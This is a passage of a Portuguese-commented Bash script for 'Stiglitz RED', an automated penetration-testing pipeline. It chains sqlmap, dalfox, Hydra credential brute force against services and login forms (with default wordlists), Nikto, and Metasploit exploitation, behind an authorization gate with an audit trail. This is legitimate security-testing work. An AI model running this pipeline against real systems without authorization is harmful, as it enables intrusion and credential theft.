        "${THREADS_OVERRIDE:-${PROFILE_SQLMAP_THREADS[$PROFILE]:-1}}" \
        "${PROFILE_MAX_EXPLOITS[$PROFILE]:-10}" \
        "${PROFILE_TIMEOUT_SQLMAP_URL[$PROFILE]:-120}" \
        "$AUTH_COOKIE" \
        "$AUTH_HEADER"

    local _sqli_confirmed
    _sqli_confirmed=$(grep -cE "SQLI" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null); _sqli_confirmed=${_sqli_confirmed:-0}
    log "Fase SQLi concluída — $(($(date +%s)-_t0))s | confirmados: ${_sqli_confirmed}"
    checkpoint_done "sqli"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 5 — XSS (dalfox)
# ═══════════════════════════════════════════════════════════════════════════════
run_xss() {
    phase "FASE 5 — XSS (dalfox)"
    audit "PHASE_START name=xss"
    local _t0; _t0=$(date +%s)
    log "Fase XSS iniciada — perfil=${PROFILE}"

    phase_enabled "xss"   || { warn "Fase 'xss' ignorada (--skip)"; log "Fase XSS: ignorada (--skip)"; audit "PHASE_END name=xss result=skipped reason=filter"; return 0; }
    checkpoint_skip "xss" && { info "XSS: retomado de checkpoint — pulando"; return 0; }

    if ! has dalfox; then
        warn "dalfox não encontrado — instale: go install github.com/hahwul/dalfox/v2@latest"
        log "Fase XSS: dalfox ausente — ignorada"
        checkpoint_done "xss"; return 0
    fi

    if [ "$DRY_RUN" = true ]; then
        warn "[DRY-RUN] xss: simulando dalfox"
        checkpoint_done "xss"; return 0
    fi

    local _xss_targets
    _xss_targets=$(wc -l < "$OUTDIR/data/targets_scored.txt" 2>/dev/null); _xss_targets=${_xss_targets:-0}
    log "Fase XSS: ${_xss_targets} URL(s) alvo"

    source "$LIB/xss.sh"
    run_xss_phase \
        "$OUTDIR/data/targets_scored.txt" \
        "$OUTDIR/xss" \
        "${PROFILE_XSS_WORKERS[$PROFILE]:-3}" \
        "${PROFILE_TIMEOUT_XSS[$PROFILE]:-300}" \
        "$AUTH_COOKIE" \
        "$AUTH_HEADER"

    local _xss_confirmed
    _xss_confirmed=$(grep -cE "XSS" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null); _xss_confirmed=${_xss_confirmed:-0}
    log "Fase XSS concluída — $(($(date +%s)-_t0))s | confirmados: ${_xss_confirmed}"
    checkpoint_done "xss"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 6 — BRUTE FORCE (hydra)
# ═══════════════════════════════════════════════════════════════════════════════
run_brute() {
    phase "FASE 6 — BRUTE FORCE (hydra)"
    audit "PHASE_START name=brute"
    local _t0; _t0=$(date +%s)
    log "Fase Brute iniciada — perfil=${PROFILE}"

    phase_enabled "brute"   || { warn "Fase 'brute' ignorada (--skip)"; log "Fase Brute: ignorada (--skip)"; audit "PHASE_END name=brute result=skipped reason=filter"; return 0; }
    checkpoint_skip "brute" && { info "Brute: retomado de checkpoint — pulando"; return 0; }

    if [ "${PROFILE_BRUTE_FORCE[$PROFILE]:-false}" != "true" ]; then
        warn "Brute force desabilitado no perfil '${PROFILE}'"
        log "Fase Brute: desabilitada no perfil ${PROFILE}"
        checkpoint_done "brute"; return 0
    fi

    if ! has hydra; then
        warn "hydra não encontrado — fase brute ignorada"
        log "Fase Brute: hydra ausente — ignorada"
        checkpoint_done "brute"; return 0
    fi

    if [ "$DRY_RUN" = true ]; then
        warn "[DRY-RUN] brute: simulando hydra (services + HTTP form)"
        checkpoint_done "brute"; return 0
    fi

    # ── Brute force de serviços (SSH, FTP, DB, RDP, SMB) ──
    log "Fase Brute: iniciando brute de serviços de rede"
    source "$LIB/brute.sh"
    run_brute_phase \
        "$OUTDIR/data/open_services.txt" \
        "${SCOPE_DOMAINS[0]}" \
        "$OUTDIR/hydra" \
        "$OUTDIR/exploits_confirmed.csv" \
        "${PROFILE_TIMEOUT_HYDRA[$PROFILE]:-300}"

    # ── Brute force HTTP form (/login, /signin, /auth) ──
    _run_http_form_brute

    local _brute_confirmed
    _brute_confirmed=$(grep -cE "BRUTE|CREDENTIAL" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null); _brute_confirmed=${_brute_confirmed:-0}
    log "Fase Brute concluída — $(($(date +%s)-_t0))s | confirmados: ${_brute_confirmed}"
    checkpoint_done "brute"
}

_run_http_form_brute() {
    local base_url="${TARGET:-https://${SCOPE_DOMAINS[0]}}"
    local wordlist_users="/usr/share/wordlists/metasploit/unix_users.txt"
    local wordlist_pass="/usr/share/wordlists/rockyou.txt"
    local hydra_timeout="${PROFILE_TIMEOUT_HYDRA[$PROFILE]:-300}"
    local _t0; _t0=$(date +%s)

    # Wordlists compactas fallback
    if [ ! -f "$wordlist_users" ]; then
        wordlist_users="$OUTDIR/hydra/http_users.txt"
        printf 'admin\nroot\nuser\ntest\nguest\nadministrator\n' > "$wordlist_users"
    fi
    if [ ! -f "$wordlist_pass" ]; then
        wordlist_pass="$OUTDIR/hydra/http_pass.txt"
        printf 'admin\npassword\n123456\ntest\nguest\nadmin123\npassword123\nletmein\nqwerty\n' > "$wordlist_pass"
    fi

    # Detectar endpoints de login no crawl
    local login_endpoints=()
    while IFS= read -r candidate; do
        [[ "$candidate" =~ /(login|signin|auth|logon|entrar|access)(\.php|\.aspx|\.jsp)?(\?|$) ]] && \
            login_endpoints+=("$candidate")
    done < <(awk -F'|' '{print $2}' "$OUTDIR/data/targets_scored.txt" 2>/dev/null | sort -u)

    # Se nenhum endpoint encontrado no crawl, testar o alvo base diretamente
    if [ "${#login_endpoints[@]}" -eq 0 ]; then
        login_endpoints=("${base_url%/}/login" "${base_url%/}/signin")
    fi

    log "HTTP form brute: ${#login_endpoints[@]} endpoint(s)"

    for ep in "${login_endpoints[@]}"; do
        # Extrair host e path para hydra
        local ep_host ep_path ep_proto ep_port
        ep_proto=$(echo "$ep" | grep -oE '^https?')
        ep_host=$(echo "$ep"  | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
        ep_port=$(echo "$ep"  | sed 's|https\?://||' | grep -oP ':\K[0-9]+' | head -1)
        ep_path=$(echo "$ep"  | sed "s|https\?://${ep_host}||" | sed "s|:${ep_port}||")
        [ -z "$ep_path" ] && ep_path="/"

        [ -z "$ep_port" ] && { [ "$ep_proto" = "https" ] && ep_port=443 || ep_port=80; }

        local hydra_service
        [ "$ep_proto" = "https" ] && hydra_service="https-post-form" || hydra_service="http-post-form"

        local out_file; out_file="$OUTDIR/hydra/http_form_$(echo "$ep_host" | tr '.' '_').txt"

        log "HTTP form brute: ${hydra_service}://${ep_host}:${ep_port}${ep_path}"

        # Tenta detectar campo de usuário/senha via curl; assume padrão "username/password" como fallback
        local form_params="^username=^USER^&password=^PASS^:Invalid\|Incorrect\|denied\|error\|failed"

        timeout "$hydra_timeout" hydra \
            -L "$wordlist_users" \
            -P "$wordlist_pass" \
            -t 4 -f \
            -o "$out_file" \
            "${ep_host}" "${hydra_service}" \
            "${ep_path}:${form_params}" \
            2>&1 | tee -a "$LOG" || true

        # Registrar credenciais encontradas
        if grep -q "login:" "$out_file" 2>/dev/null; then
            while IFS= read -r cred_line; do
                [[ "$cred_line" =~ "login:" ]] || continue
                local cred_user cred_pass
                cred_user=$(echo "$cred_line" | grep -oP 'login: \K\S+')
                cred_pass=$(echo "$cred_line" | grep -oP 'password: \K\S+')
                echo "BRUTE|HTTP_FORM|${ep}|${cred_user}|${cred_pass}|$(date -Iseconds)" \
                    >> "$OUTDIR/exploits_confirmed.csv"
                warn "CREDENCIAL ENCONTRADA: ${cred_user}:${cred_pass} @ ${ep}"
            done < "$out_file"
        fi
    done

    log "HTTP form brute concluído — $(($(date +%s)-_t0))s"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 7 — SERVICES (nikto + metasploit + searchsploit)
# ═══════════════════════════════════════════════════════════════════════════════
run_services() {
    phase "FASE 7 — SERVICES (nikto + metasploit + searchsploit)"
    audit "PHASE_START name=services"
    local _t0; _t0=$(date +%s)
    log "Fase Services iniciada — perfil=${PROFILE}"

    phase_enabled "services"   || { warn "Fase 'services' ignorada (--skip)"; log "Fase Services: ignorada (--skip)"; audit "PHASE_END name=services result=skipped reason=filter"; return 0; }
    checkpoint_skip "services" && { info "Services: retomado de checkpoint — pulando"; return 0; }

    # ── Nikto ──
    if [ "${PROFILE_NIKTO_ENABLED[$PROFILE]:-false}" = "true" ]; then
        if [ "$DRY_RUN" = true ]; then
            warn "[DRY-RUN] nikto: simulando scan em ${TARGET:-https://${SCOPE_DOMAINS[0]}}"
        elif has nikto; then
            log "Nikto: iniciando em ${TARGET:-https://${SCOPE_DOMAINS[0]}}"
            local _t_nikto; _t_nikto=$(date +%s)
            source "$LIB/web.sh"
            run_nikto_phase \
                "${TARGET:-https://${SCOPE_DOMAINS[0]}}" \
                "$OUTDIR/nikto" \
                "${PROFILE_TIMEOUT_NIKTO[$PROFILE]:-700}" \
                "$AUTH_COOKIE"
            log "Nikto: concluído em $(($(date +%s)-_t_nikto))s"
        else
            warn "Nikto: não encontrado — instale via setup.sh"
            log "Nikto: ausente — ignorado"
        fi
    else
        warn "Nikto: desabilitado no perfil '${PROFILE}'"
        log "Nikto: desabilitado no perfil ${PROFILE}"
    fi

    if [ "$DRY_RUN" = true ]; then
        warn "[DRY-RUN] metasploit + searchsploit: simulando"
        checkpoint_done "services"; return 0
    fi

    # ── Metasploit ──
    local cves_file="$OUTDIR/data/cves_found.txt"
    if [ "$NO_MSF" = false ] && has msfconsole; then
        if [ -f "$cves_file" ] && [ -s "$cves_file" ]; then
            local n_cves; n_cves=$(wc -l < "$cves_file")
            log "Metasploit: ${n_cves} CVE(s) para correlacionar — lhost=${LHOST}:${LPORT}"
            local _t_msf; _t_msf=$(date +%s)
            source "$LIB/msf.sh"
            run_msf_phase \
                "$cves_file" \
                "${SCOPE_DOMAINS[0]}" \
                "$LHOST" "$LPORT" \
                "${PROFILE_MSF_PAYLOAD[$PROFILE]:-NONE}" \
                "$OUTDIR/metasploit" \
                "${PROFILE_TIMEOUT_MSF[$PROFILE]:-600}"
            log "Metasploit: concluído em $(($(date +%s)-_t_msf))s"
        else
            warn "Metasploit: sem CVEs para correlacionar"
            log "Metasploit: sem CVEs — ignorado"
        fi
    elif [ "$NO_MSF" = true ]; then
        warn "Metasploit: desabilitado por --no-msf"
        log "Metasploit: desabilitado (--no-msf)"
    else
        warn "msfconsole não encontrado — instale via setup.sh"
        log "Metasploit: msfconsole ausente — ignorado"
    fi

    # ── SearchSploit ──
    if has searchsploit; then
        if [ -f "$cves_file" ] && [ -s "$cves_file" ]; then
            mkdir -p "$OUTDIR/searchsploit"
            log "SearchSploit: pesquisando $(wc -l < "$cves_file") CVE(s)"
            while IFS= read -r cve; do
                [ -z "$cve" ] && continue
                dry_cmd searchsploit --json "$cve" \
                    > "$OUTDIR/searchsploit/${cve}.json" 2>/dev/null || true
            done < "$cves_file"
            local n_ss; n_ss=$(ls "$OUTDIR/searchsploit/"*.json 2>/dev/null | wc -l)
            info "SearchSploit: ${n_ss} pesquisas"
            log "SearchSploit: ${n_ss} arquivo(s) gerados"
        fi
    else
        log "SearchSploit: não encontrado — ignorado"
    fi

    log "Fase Services concluída — $(($(date +%s)-_t0))s"
    checkpoint_done "services"
}

# ── Notificação (Telegram ou Slack/webhook genérico) ──────────────────────────
# Configuração via variáveis de ambiente:
#   Telegram:      export STIGLITZ_TELEGRAM_TOKEN=<bot_token> STIGLITZ_TELEGRAM_CHAT=<chat_id>
#   Slack/generic: export STIGLITZ_NOTIFY_WEBHOOK=https://hooks.slack.com/...
#   Teams:         export STIGLITZ_TEAMS_WEBHOOK=https://outlook.office.com/webhook/...
#                  (ou URL do Power Automate Workflow)
send_notification() {
    local message="$1"
    local token="${STIGLITZ_TELEGRAM_TOKEN:-}"
    local chat="${STIGLITZ_TELEGRAM_CHAT:-}"
    local webhook="${STIGLITZ_NOTIFY_WEBHOOK:-}"
    local teams="${STIGLITZ_TEAMS_WEBHOOK:-}"

    if [ -n "$token" ] && [ -n "$chat" ]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendMessage" \
            -d "chat_id=${chat}" \
            --data-urlencode "text=${message}" \
            -d "parse_mode=HTML" \
            --max-time 10 >/dev/null 2>&1 || true
    fi

    if [ -n "$teams" ]; then
        # Formata como MessageCard (compatível com legacy connector e Power Automate)
        local escaped
        escaped=$(echo "$message" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n')
        local teams_payload
        teams_payload=$(printf '{
  "@type": "MessageCard",
  "@context": "https://schema.org/extensions",
  "themeColor": "CC0000",
  "summary": "Stiglitz RED — scan concluído",
  "sections": [{ "activityTitle": "🎯 Stiglitz RED v%s", "activityText": "%s" }]
}' "$VERSION" "$escaped")
        curl -s -X POST "$teams" \
            -H "Content-Type: application/json" \
            -d "$teams_payload" \
            --max-time 10 >/dev/null 2>&1 || true
    fi

    if [ -n "$webhook" ]; then
        local payload
        payload=$(printf '{"text":"%s"}' "$(echo "$message" | sed 's/"/\\"/g')")
        curl -s -X POST "$webhook" \
            -H "Content-Type: application/json" \
            -d "$payload" \
            --max-time 10 >/dev/null 2>&1 || true
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  GATE DE AUTORIZAÇÃO
# ═══════════════════════════════════════════════════════════════════════════════
authorization_gate() {
    echo ""
    echo -e "${YLW}╔══════════════════════════════════════════════════════════╗${RST}"
    echo -e "${YLW}║           GATE DE AUTORIZAÇÃO — Stiglitz RED v${VERSION}        ║${RST}"
    echo -e "${YLW}╚══════════════════════════════════════════════════════════╝${RST}"
    echo ""
    echo -e "  ${BLD}Perfil:${RST}  ${PROFILE^^}"
    echo -e "  ${BLD}Escopo:${RST}  ${SCOPE_DOMAINS[*]}"
    echo -e "  ${BLD}Modo:${RST}    ${MODE^^}"
    echo -e "  ${BLD}Output:${RST}  $OUTDIR"
    echo ""
    echo -e "  Fases: recon → surface → crawl → sqli → xss → brute → services"
    echo ""
    echo -e "  ${RED}${BLD}AVISO:${RST} Este script executa testes de penetração ativos."
    echo -e "  Use SOMENTE em sistemas com autorização formal documentada."
    echo -e "  Uso não autorizado é crime (Art. 154-A CP / CFAA)."
    echo ""

    # RoE (Rules of Engagement): se informado, valida e registra no audit trail.
    local roe_sha="(não informado)"
    if [ -n "$ROE_FILE" ]; then
        [ -f "$ROE_FILE" ] || { fail "RoE não encontrado: $ROE_FILE"; exit 1; }
        [ -s "$ROE_FILE" ] || { fail "RoE vazio: $ROE_FILE"; exit 1; }
        roe_sha=$(sha256sum "$ROE_FILE" 2>/dev/null | cut -d' ' -f1)
        echo -e "  ${BLD}RoE:${RST}     $ROE_FILE  (sha256: ${roe_sha:0:16}…)"
        echo ""
    fi
    local _op="${USER:-$(id -un 2>/dev/null || echo unknown)}"

    # Inicializar audit trail (hash chain) amarrado ao RoE.
    audit_init "${roe_sha:-0000000000000000}"
    audit "PROFILE=${PROFILE} MODE=${MODE} SCOPE=${SCOPE_DOMAINS[*]} OPERATOR=${_op}"

    if [ "$DRY_RUN" = true ]; then
        warn "[DRY-RUN] Autorização simulada — nenhum teste real será executado"
        log "DRY-RUN autorizado. Operador=${_op} Perfil=${PROFILE} Modo=${MODE} Escopo=${SCOPE_DOMAINS[*]} RoE=${roe_sha}"
        audit "AUTHORIZED via=dry-run"
        return 0
    fi

    # Bypass para execução encadeada pelo stiglitz_full.sh.
    # Só é aceito acompanhado de um RoE válido — o env var sozinho não basta.
    if [ "${STIGLITZ_AUTHORIZED:-0}" = "1" ]; then
        if [ -z "$ROE_FILE" ]; then
            fail "Bypass do orquestrador requer --roe <arquivo> (RoE assinado). Abortando."
            audit "AUTHORIZATION_DENIED reason=orchestrator-without-roe"
            exit 1
        fi
        info "Autorizado pelo orquestrador Stiglitz FULL (RoE validado)."
        log "AUTORIZADO (orquestrador). Operador=${_op} Perfil=${PROFILE} Modo=${MODE} Escopo=${SCOPE_DOMAINS[*]} RoE=${roe_sha}"
        audit "AUTHORIZED via=orchestrator"
        return 0
    fi

    # Não interativo (sem TTY) e sem orquestrador → não há como confirmar: aborta.
    if [ ! -t 0 ]; then
        fail "Sem terminal interativo e sem autorização do orquestrador. Abortando."
        audit "AUTHORIZATION_DENIED reason=no-tty-no-orchestrator"
        exit 1
    fi

    echo -e "  Digite ${BLD}EU AUTORIZO${RST} para confirmar e iniciar os testes:"
    read -r _auth_input
    if [[ "$_auth_input" != "EU AUTORIZO" ]]; then
        fail "Autorização não confirmada. Abortando."
        audit "AUTHORIZATION_DENIED reason=user-declined"
        exit 1
    fi
    log "AUTORIZADO (interativo). Operador=${_op} Perfil=${PROFILE} Modo=${MODE} Escopo=${SCOPE_DOMAINS[*]} RoE=${roe_sha}"
    audit "AUTHORIZED via=interactive"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 8 — RELATÓRIO
# ═══════════════════════════════════════════════════════════════════════════════
run_report() {
    phase "FASE 8 — RELATÓRIO"
    audit "PHASE_START name=report"
    local _t0; _t0=$(date +%s)
    log "Fase Report iniciada"

    local target_domain="${SCOPE_DOMAINS[0]}"
    local total_urls
    total_urls=$(wc -l < "$OUTDIR/data/targets_scored.txt" 2>/dev/null) || total_urls=0
    local n_confirmed
    n_confirmed=$(grep -cE "SQLI|XSS|BRUTE|VULNERABLE" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null); n_confirmed=${n_confirmed:-0}
    local failed=$(( total_urls - n_confirmed ))
    [ "$failed" -lt 0 ] && failed=0

    log "Gerando relatório HTML — alvo=${target_domain} confirmados=${n_confirmed}/${total_urls}"

    # Passar SCAN_DIR para integrar findings do Stiglitz de origem
    local report_out
    report_out=$(python3 "$LIB/report_generator.py" \
        "$OUTDIR" "$target_domain" "$PROFILE" "$total_urls" "$n_confirmed" "$failed" "$VERSION" \
        ${SCAN_DIR:+--scan-dir "$SCAN_DIR"} 2>&1)

    if echo "$report_out" | grep -q "REPORT_OK:"; then
        local report_file
        report_file=$(echo "$report_out" | grep "REPORT_OK:" | sed 's/REPORT_OK://')
        info "Relatório: $report_file"
        log "REPORT_OK: $report_file | $(($(date +%s)-_t0))s"
    else
        warn "Erro no relatório: $report_out"
        log "Fase Report: ERRO — ${report_out}"
    fi

    # Auto-diff: comparar com scan anterior do mesmo domínio
    local domain="${SCOPE_DOMAINS[0]//[^a-zA-Z0-9._-]/_}"
    local prev_scan
    prev_scan=$(find . -maxdepth 1 -type d -name "stiglitz_red_${domain}_*" \
        ! -path "./${OUTDIR}" 2>/dev/null | sort -r | head -1)
    if [ -n "$prev_scan" ] && [ -f "${SCRIPT_DIR}/stiglitz_diff.py" ]; then
        log "Diff com scan anterior: $prev_scan"
        python3 "${SCRIPT_DIR}/stiglitz_diff.py" "$prev_scan" "$OUTDIR" --html 2>/dev/null \
            && info "Diff gerado: ver stiglitz_diff_*.html" || warn "scan_diff: falhou (não crítico)"
    fi

    log "Fase Report concluída — $(($(date +%s)-_t0))s"
    audit "PHASE_END name=report result=ok"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  SUMÁRIO FINAL
# ═══════════════════════════════════════════════════════════════════════════════
print_summary() {
    local n_sqli=0 n_xss=0 n_brute=0
    n_sqli=$(grep -c "SQLI\|SQL_INJECT" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null); n_sqli=${n_sqli:-0}
    n_xss=$(grep -c "XSS" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null); n_xss=${n_xss:-0}
    n_brute=$(grep -c "BRUTE\|CREDENTIAL" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null); n_brute=${n_brute:-0}
    local total=$(( n_sqli + n_xss + n_brute ))

    echo ""
    echo -e "${CYN}═══════════════════════════════════════════════════════════${RST}"
    echo -e "${CYN}  SUMÁRIO FINAL — Stiglitz RED v${VERSION}${RST}"
    echo -e "${CYN}═══════════════════════════════════════════════════════════${RST}"
    echo ""
    printf "  %-12s %s\n" "Alvo:"   "${SCOPE_DOMAINS[*]}"
    printf "  %-12s %s\n" "Modo:"   "${MODE^^}"
    printf "  %-12s %s\n" "Perfil:" "${PROFILE^^}"
    printf "  %-12s %s\n" "Output:" "$OUTDIR"
    echo ""
    printf "  %-12s %d\n" "SQLi:"  "$n_sqli"
    printf "  %-12s %d\n" "XSS:"   "$n_xss"
    printf "  %-12s %d\n" "Brute:" "$n_brute"
    echo ""

    if [ "$total" -gt 0 ]; then
        echo -e "  ${RED}${BLD}⚠  $total finding(s) confirmado(s) — revisar relatório imediatamente${RST}"
    else
        echo -e "  ${GRN}${BLD}✓  Nenhum finding crítico confirmado${RST}"
    fi

    echo ""
    echo -e "  ${DIM}Relatório:${RST} ${OUTDIR}/stiglitz_red_report.html"
    echo -e "  ${DIM}Log:${RST}       ${OUTDIR}/stiglitz_red.log"
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════
main() {
    parse_args "$@"
    validate
    load_profiles

    # --profile-file: aplica overrides após carregar defaults.
    # profile_loader.py valida o JSON e emite assignments bash.
    if [ -n "$PROFILE_FILE" ]; then
        local _overrides
        _overrides=$(python3 "$LIB/profile_loader.py" "$PROFILE_FILE" "$PROFILE" 2>&1) || {
            fail "profile_loader: $_overrides"; exit 1; }
        eval "$_overrides"
        info "Profile customizado aplicado: $PROFILE_FILE (perfil ativo: $PROFILE)"
    fi

    # Criar diretório de saída
    local ts; ts=$(date +%Y%m%d_%H%M%S)
    local domain="${SCOPE_DOMAINS[0]//[^a-zA-Z0-9._-]/_}"

    if [ -n "$OUTDIR_OVERRIDE" ]; then
        OUTDIR="$OUTDIR_OVERRIDE"
    else
        OUTDIR="stiglitz_red_${domain}_${ts}"
        # Convenção local: STIGLITZ_OUTDIR_BASE ancora a saída fora do repo (por host)
        if [ -n "${STIGLITZ_OUTDIR_BASE:-}" ]; then
            OUTDIR="${STIGLITZ_OUTDIR_BASE%/}/${domain}/${OUTDIR}"
        fi
    fi

    mkdir -p "$OUTDIR"/{data,recon,crawl,sqlmap,xss,hydra,nikto,metasploit,searchsploit,poc}
    : > "$OUTDIR/exploits_confirmed.csv"

    LOG="$OUTDIR/stiglitz_red.log"
    STATE_FILE="$OUTDIR/.stiglitz_red_state"
    [ ! -f "$STATE_FILE" ] && touch "$STATE_FILE"

    banner
    log "Stiglitz RED v${VERSION} iniciado — Modo=${MODE^^} Perfil=${PROFILE^^} Escopo=${SCOPE_DOMAINS[*]}"

    authorization_gate

    run_recon
    run_surface
    run_crawl
    run_ingest
    run_bizlogic
    run_sqli
    run_xss
    run_brute
    run_services
    run_report
    print_summary

    log "Stiglitz RED concluído — Output: $OUTDIR"

    # Notificação ao finalizar
    local n_sqli_f n_xss_f n_brute_f n_total_f
    n_sqli_f=$(grep -c "SQLI\|SQL_INJECT" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null); n_sqli_f=${n_sqli_f:-0}
    n_xss_f=$(grep -c "XSS" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null); n_xss_f=${n_xss_f:-0}
    n_brute_f=$(grep -c "BRUTE\|CREDENTIAL" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null); n_brute_f=${n_brute_f:-0}
    n_total_f=$(( n_sqli_f + n_xss_f + n_brute_f ))
    send_notification "[Stiglitz RED v${VERSION}] Concluído
Alvo: ${SCOPE_DOMAINS[*]}
Perfil: ${PROFILE^^} | Modo: ${MODE^^}
Findings: ${n_total_f} (SQLi:${n_sqli_f} XSS:${n_xss_f} Brute:${n_brute_f})
Output: ${OUTDIR}"
    audit_seal
}

main "$@"
